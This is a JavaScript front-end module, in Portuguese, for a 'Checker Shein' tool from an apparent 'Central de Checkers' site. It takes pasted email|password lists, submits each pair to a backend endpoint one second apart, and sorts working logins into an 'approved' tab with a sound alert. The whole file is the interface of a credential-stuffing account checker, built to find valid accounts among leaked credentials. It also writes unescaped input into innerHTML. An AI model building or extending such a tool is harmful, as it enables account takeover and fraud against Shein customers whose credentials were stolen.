// /tools/shein_checker/index.js (Versão Final Corrigida)

export function render(appRoot) {
  document.title = "Checker Shein | Central de Checkers Pro";

  const toolStyle = `
        :root {
            --primary-color: #ff6b35; --secondary-color: #1a1a2e; --accent-color: #16213e;
            --success-color: #28a745; --danger-color: #dc3545; --warning-color: #ffc107;
            --info-color: #17a2b8; --dark-bg: #0f0f23; --card-bg: rgba(26, 26, 46, 0.9);
            --text-light: #ffffff; --text-muted: #b8b9ba; --border-color: #2d2d44;
        }
        .checker-container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header-card { background: linear-gradient(135deg, var(--card-bg) 0%, var(--accent-color) 100%); border: 1px solid var(--border-color); border-radius: 20px; padding: 30px; margin-bottom: 30px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3); position: relative; overflow: hidden; }
        .header-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(90deg, var(--primary-color), var(--info-color), var(--success-color)); }
        .header-title { font-size: 2.5rem; font-weight: 700; background: linear-gradient(135deg, var(--primary-color), var(--info-color)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; margin-bottom: 10px; text-align: center; }
        .header-subtitle { color: var(--text-muted); text-align: center; font-size: 1.1rem; margin-bottom: 30px; }
        .control-panel, .stats-container, .input-area, .results-tabs { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 15px; padding: 25px; margin-bottom: 30px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); }
        .btn-custom { padding: 12px 25px; border-radius: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; transition: all 0.3s ease; border: none; margin: 5px; position: relative; overflow: hidden; }
        .btn-custom::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent); transition: left 0.5s; }
        .btn-custom:hover::before { left: 100%; }
        .btn-start { background: linear-gradient(135deg, var(--success-color), #20c997); color: white; }
        .btn-pause { background: linear-gradient(135deg, var(--warning-color), #fd7e14); color: white; }
        .btn-stop { background: linear-gradient(135deg, var(--danger-color), #e74c3c); color: white; }
        .btn-clean { background: linear-gradient(135deg, var(--info-color), #3498db); color: white; }
        .status-badge { padding: 10px 20px; border-radius: 25px; font-weight: 600; font-size: 1rem; display: inline-block; margin-top: 15px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        .stat-item { background: var(--accent-color); border-radius: 10px; padding: 20px; text-align: center; margin: 10px; border: 1px solid var(--border-color); transition: transform 0.3s ease; }
        .stat-item:hover { transform: translateY(-5px); }
        .stat-number { font-size: 2rem; font-weight: 700; margin-bottom: 5px; }
        .stat-label { color: var(--text-muted); font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; }
        .custom-textarea { background: var(--accent-color); color: var(--text-light); border: 2px solid var(--border-color); border-radius: 10px; padding: 20px; font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.5; resize: vertical; transition: border-color 0.3s ease; width: 100%; min-height: 200px; }
        .custom-textarea:focus { outline: none; border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(255, 107, 53, 0.1); }
        .results-tabs .nav-tabs { background: var(--accent-color); border: none; padding: 0; }
        .results-tabs .nav-link { background: transparent; border: none; color: var(--text-muted); padding: 20px 25px; font-weight: 600; transition: all 0.3s ease; position: relative; }
        .results-tabs .nav-link.active { background: var(--card-bg); color: var(--text-light); }
        .results-tabs .nav-link.active::after { content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 3px; background: var(--primary-color); transition: width 0.3s ease; }
        .results-tabs .tab-content { padding: 25px; }
        .result-item { background: var(--accent-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 15px; margin-bottom: 10px; font-family: 'Courier New', monospace; font-size: 14px; word-break: break-all; animation: slideIn 0.3s ease; }
        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
        .result-success { border-left: 4px solid var(--success-color); background: rgba(40, 167, 69, 0.1); }
        .result-error { border-left: 4px solid var(--danger-color); background: rgba(220, 53, 69, 0.1); }
        .result-warning { border-left: 4px solid var(--warning-color); background: rgba(255, 193, 7, 0.1); }
        .loading-spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255, 255, 255, 0.3); border-radius: 50%; border-top-color: var(--primary-color); animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    `;

  const styleSheet = document.createElement("style");
  styleSheet.id = "checker-style";
  styleSheet.textContent = toolStyle;
  if (document.getElementById("checker-style")) {
    document.getElementById("checker-style").remove();
  }
  document.head.appendChild(styleSheet);

  appRoot.innerHTML = `
      <div class="checker-container cyber-fade-in">
        <div class="header-card">
            <div class="position-absolute top-0 start-0 p-3">
                <a href="#dashboard" class="btn btn-sm btn-outline-light cyber-link"><i class="fas fa-arrow-left"></i> Voltar para o Dashboard</a>
            </div>
            <h1 class="header-title"><i class="fas fa-shield-alt"></i> CHECKER SHEIN</h1>
            <p class="header-subtitle"><i class="fas fa-envelope"></i> Testador de Contas Shein - Email|Senha</p>
            <div class="text-center">
                <button class="btn btn-custom btn-start" id="chk-start"><i class="fas fa-play"></i> Iniciar</button>
                <button class="btn btn-custom btn-pause" id="chk-pause" disabled><i class="fas fa-pause"></i> Pausar</button>
                <button class="btn btn-custom btn-stop" id="chk-stop" disabled><i class="fas fa-stop"></i> Parar</button>
                <button class="btn btn-custom btn-clean" id="chk-clean"><i class="fas fa-trash-alt"></i> Limpar</button>
            </div>
            <div class="text-center">
                <span class="status-badge badge bg-warning" id="estatus"><i class="fas fa-clock"></i> Aguardando início...</span>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-12"> 
                <div class="input-area">
                    <h5 class="mb-3"><i class="fas fa-list"></i> Lista de Contas (Email|Senha)</h5>
                    <textarea id="lista_contas" class="custom-textarea" placeholder="Insira suas contas no formato:\\nemail@exemplo.com|senha123\\noutro@email.com|minhasenha\\n\\nUma conta por linha..." rows="12"></textarea>
                </div>
            </div>
        </div>
        <div class="results-tabs">
             <ul class="nav nav-tabs" id="resultTabs" role="tablist">
                <li class="nav-item" role="presentation"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#lives-content"><i class="fas fa-check-circle text-success"></i> Aprovadas (<span class="val-lives">0</span>)</button></li>
                <li class="nav-item" role="presentation"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#dies-content"><i class="fas fa-times-circle text-danger"></i> Reprovadas (<span class="val-dies">0</span>)</button></li>
                <li class="nav-item" role="presentation"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#errors-content"><i class="fas fa-exclamation-triangle text-warning"></i> Erros (<span class="val-errors">0</span>)</button></li>
            </ul>
            <div class="tab-content">
                <div class="tab-pane fade show active" id="lives-content">
                    <div id="lives-results" class="results-container"></div>
                </div>
                <div class="tab-pane fade" id="dies-content">
                    <div id="dies-results" class="results-container"></div>
                </div>
                <div class="tab-pane fade" id="errors-content">
                    <div id="errors-results" class="results-container"></div>
                </div>
            </div>
        </div>
      </div>
    `;
  initCheckerLogic();
}

function initCheckerLogic() {
  let total = 0,
    tested = 0,
    lives = 0,
    dies = 0,
    errors = 0;
  let stopped = true,
    paused = false;
  const audio = new Audio(
    "data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmGgU7k9n1unEiBC13yO/eizEIHWq+8+OWT"
  );

  const $ = (selector) => document.querySelector(selector);
  const $$ = (selector) => document.querySelectorAll(selector);

  function removeLinha() {
    const lines = $("#lista_contas").value.split("\n");
    lines.splice(0, 1);
    $("#lista_contas").value = lines.join("\n");
  }

  function atualizarStats() {
    $$(".val-lives").forEach((el) => (el.textContent = lives));
    $$(".val-dies").forEach((el) => (el.textContent = dies));
    $$(".val-errors").forEach((el) => (el.textContent = errors));
  }

  function adicionarResultado(tipo, conteudo, resposta) {
    const timestamp = new Date().toLocaleTimeString();
    let classe, destino;
    if (tipo === "success") {
      classe = "result-success";
      destino = "#lives-results";
    } else if (tipo === "error") {
      classe = "result-error";
      destino = "#dies-results";
    } else {
      classe = "result-warning";
      destino = "#errors-results";
    }
    const item = `<div class="result-item ${classe}"><strong>[${timestamp}]</strong> ${conteudo}<br><small>${resposta}</small></div>`;
    $(destino).insertAdjacentHTML("afterbegin", item);
  }

  async function testar(lista) {
    if (stopped || paused) return;
    if (tested >= total) {
      $("#estatus").className = "status-badge badge bg-success";
      $("#estatus").innerHTML =
        '<i class="fas fa-check"></i> Teste finalizado!';
      $("#chk-start").disabled = false;
      $("#chk-stop").disabled = true;
      $("#chk-pause").disabled = true;
      stopped = true;
      return;
    }

    const conteudo = lista[tested];
    
    let ajaxData = { lista: conteudo };
    let statusMessage = `<span class="loading-spinner"></span> Testando: ${conteudo}`;

    $("#estatus").className = "status-badge badge bg-info";
    $("#estatus").innerHTML = statusMessage;

    try {
      const response = await fetch("/api/tools/shein_checker", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(ajaxData),
      });

      const data = await response.json();

      if (stopped || paused) return;
      tested++;

      if (data.success === true) {
        lives++;
        $("#estatus").className = "status-badge badge bg-success";
        $("#estatus").innerHTML =
          '<i class="fas fa-check"></i> APROVADA: ' + conteudo;
        const responseText = `Email: ${data.email} | Senha: ${data.senha} | Status: ${data.status}`;
        adicionarResultado("success", conteudo, responseText);
        audio.play().catch(() => {});
      } else {
        dies++;
        $("#estatus").className = "status-badge badge bg-danger";
        $("#estatus").innerHTML =
          '<i class="fas fa-times"></i> REPROVADA: ' + conteudo;
        const responseText = `Email: ${data.email} | Status: ${data.status}`;
        adicionarResultado("error", conteudo, responseText);
      }
    } catch (error) {
      if (stopped || paused) return;
      tested++;
      errors++;
      const errorMsg = `Erro de conexão: ${error.message}`;
      adicionarResultado("warning", conteudo, errorMsg);
    } finally {
      if (!stopped && !paused) {
        atualizarStats();
        removeLinha();
        setTimeout(() => testar(lista), 1000);
      }
    }
  }

  $("#chk-start").addEventListener("click", function () {
    if (paused) {
      paused = false;
      $("#chk-start").disabled = true;
      $("#chk-pause").disabled = false;
      const lista = $("#lista_contas")
        .value.trim()
        .split("\n")
        .filter((line) => line.trim());
      testar(lista); 
      return;
    }

    const lista = $("#lista_contas")
      .value.trim()
      .split("\n")
      .filter((line) => line.trim());
    if (lista.length === 0) return;

    total = lista.length;
    tested = lives = dies = errors = 0;
    stopped = false;
    paused = false;

    atualizarStats();

    $("#chk-start").disabled = true;
    $("#chk-stop").disabled = false;
    $("#chk-pause").disabled = false;

    testar(lista);
  });

  $("#chk-pause").addEventListener("click", function () {
    paused = true;
    $("#chk-start").disabled = false;
    $("#chk-pause").disabled = true;
    $("#estatus").className = "status-badge badge bg-warning";
    $("#estatus").innerHTML = '<i class="fas fa-pause"></i> Pausado';
  });

  $("#chk-stop").addEventListener("click", function () {
    stopped = true;
    $("#chk-start").disabled = false;
    $("#chk-stop").disabled = true;
    $("#chk-pause").disabled = true;
    $("#estatus").className = "status-badge badge bg-secondary";
    $("#estatus").innerHTML = '<i class="fas fa-stop"></i> Parado';
  });

  $("#chk-clean").addEventListener("click", function () {
    stopped = true;
    total = tested = lives = dies = errors = 0;
    paused = false;
    atualizarStats();
    $("#lista_contas").value = "";
    $$(".results-container").forEach((el) => (el.innerHTML = ""));
    $("#estatus").className = "status-badge badge bg-warning";
    $("#estatus").innerHTML = '<i class="fas fa-clock"></i> Aguardando...';
  });
}
